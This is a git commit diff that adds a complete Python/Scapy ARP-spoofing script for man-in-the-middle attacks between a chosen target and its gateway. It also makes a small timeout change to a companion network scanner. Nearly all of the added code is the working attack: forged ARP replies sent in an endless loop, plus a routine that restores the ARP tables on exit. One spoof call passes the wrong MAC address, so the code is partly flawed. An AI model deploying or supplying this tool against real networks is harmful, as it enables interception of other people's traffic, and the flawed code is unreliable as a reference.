72a1ee2b3e66a27d90129b44d88d7ba2bdbfcadb
Santiago Rocha <santiago.infsec@gmail.com>
2019-12-15 22:48:01 +0100

    Modified scanner and added spoofer

---
+++ arp_spoof.py
@@ -0,0 +1,55 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+import time, sys, argparse
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="Enter the target IP")
+    parser.add_argument("-g", "--gateway", dest="gateway", help="Enter the gateway IP")
+    args = parser.parse_args()
+    if not args.target:
+        parser.error("[-] Specify target IP, use --help for more info")
+    elif not args.gateway:
+        parser.error("[-] Specify gateway IP, use --help for more info")
+    return args
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
+    
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip, target_mac):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(dst_ip, src_ip, target_mac, gateway_mac):
+    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=target_mac, psrc=src_ip, hwsrc=gateway_mac)
+    scapy.send(packet, count=2, verbose=False)
+
+args = get_arguments()
+
+target_ip = args.target
+gateway_ip = args.gateway
+
+target_mac = get_mac(target_ip)
+gateway_mac = get_mac(gateway_ip)
+
+try:
+    sent_packets_count = 0
+    while True: 
+        spoof(target_ip, gateway_ip, target_mac)
+        spoof(gateway_ip, target_ip, target_mac)
+        sent_packets_count += 2
+        print("\r[+] Packet sent: " + str(sent_packets_count)),
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL+C, Stopping MiTM...")
+    time.sleep(1)
+    restore(target_ip, gateway_ip, target_mac, gateway_mac)
+    restore(gateway_ip, target_ip, gateway_mac, target_mac)
+    print("[+] Stopped, Quitting...")
--- net_scanner.py
+++ net_scanner.py
@@ -15,7 +15,7 @@ def scan(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
+    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
 
     hosts_list = []
     for element in answered_list:
